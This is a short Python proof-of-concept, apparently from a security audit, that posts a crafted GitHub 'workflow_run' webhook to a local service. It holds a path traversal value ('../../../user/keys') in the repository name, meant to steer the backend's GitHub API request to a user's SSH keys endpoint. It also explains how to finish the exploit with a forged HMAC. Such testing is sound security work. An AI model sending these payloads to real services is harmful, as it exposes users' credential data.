import httpx

# [S7] No input sanitization on repo_full_name
# The backend uses `repo_full_name` directly from the payload to construct GitHub API URLs:
# f"https://api.github.com/repos/{repo_full_name}/actions/runs"

url = "http://localhost:8000/webhook/github"

# Malicious payload with path traversal in repo name
payload = {
    "action": "completed",
    "workflow_run": {
        "id": 123456,
        "head_sha": "abcdef123456",
        "conclusion": "failure",
        "head_branch": "main",
        "name": "CI",
        # Path traversal attempt: breaks out of /repos/ and hits another API
        "repository": {
            "id": 999,
            "name": "repo",
            "full_name": "../../../user/keys" 
        }
    }
}

print("=== Testing Repo Name Injection ===")
print("Sending webhook with malicious repo_full_name: '../../../user/keys'")

try:
    # Requires valid HMAC signature to pass verification first, 
    # but if an attacker has the webhook secret (or if signature check is bypassed/buggy),
    # this will cause the backend to fetch https://api.github.com/user/keys
    
    # We send an empty signature to fail gracefully if we don't have the secret,
    # but the vulnerability is in the *usage* of the field post-validation.
    response = httpx.post(url, json=payload, headers={"X-GitHub-Event": "workflow_run"})
    print(f"Response Status: {response.status_code}")
    print("To fully exploit this, calculate the HMAC of the payload using the WEBHOOK_SECRET and pass it in X-Hub-Signature-256.")
except Exception as e:
    print(f"Request failed: {e}")
